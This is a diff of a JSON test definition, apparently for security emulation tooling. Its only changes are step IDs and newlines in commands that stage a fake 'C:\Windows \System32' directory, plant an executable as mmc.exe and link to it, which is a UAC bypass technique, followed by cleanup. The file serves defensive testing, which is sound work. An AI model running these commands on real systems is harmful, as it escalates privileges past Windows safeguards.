@@ -7,19 +7,19 @@
   ],
   "steps": [
     {
-      "id": "f331a7f4-3ef3-420b-aafd-4646f52d71c1",
+      "id": "fd7828b0-e462-49cc-8ba9-92c71207caa5",
       "type": "execute-command",
       "data": {
-        "command": "mkdir \"\\\\?\\C:\\Windows \\System32\\\"\ncopy \"#{executable_binary}\" \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\nmklink c:\\testbypass.exe \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\n",
+        "command": "mkdir \"\\\\?\\C:\\Windows \\System32\\\"\ncopy \"#{executable_binary}\" \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\nmklink c:\\testbypass.exe \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"",
         "command_type": "command_prompt"
       },
       "elevation_required": true
     },
     {
-      "id": "88f02664-2de7-4bcd-991a-4b9603224cff",
+      "id": "2a274d1d-12b1-48bc-abe0-92194860e192",
       "type": "execute-command",
       "data": {
-        "command": "rd \"\\\\?\\C:\\Windows \\\" /S /Q \u003enul 2\u003enul\ndel \"c:\\testbypass.exe\" \u003enul 2\u003enul\n",
+        "command": "rd \"\\\\?\\C:\\Windows \\\" /S /Q \u003enul 2\u003enul\ndel \"c:\\testbypass.exe\" \u003enul 2\u003enul",
         "command_type": "command_prompt"
       },
       "elevation_required": true
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "f331a7f4-3ef3-420b-aafd-4646f52d71c1",
+      "s": "fd7828b0-e462-49cc-8ba9-92c71207caa5",
       "p": "on-success",
-      "o": "88f02664-2de7-4bcd-991a-4b9603224cff"
+      "o": "2a274d1d-12b1-48bc-abe0-92194860e192"
     },
     {
-      "s": "f331a7f4-3ef3-420b-aafd-4646f52d71c1",
+      "s": "fd7828b0-e462-49cc-8ba9-92c71207caa5",
       "p": "on-failure",
-      "o": "88f02664-2de7-4bcd-991a-4b9603224cff"
+      "o": "2a274d1d-12b1-48bc-abe0-92194860e192"
     }
   ],
   "tags": [
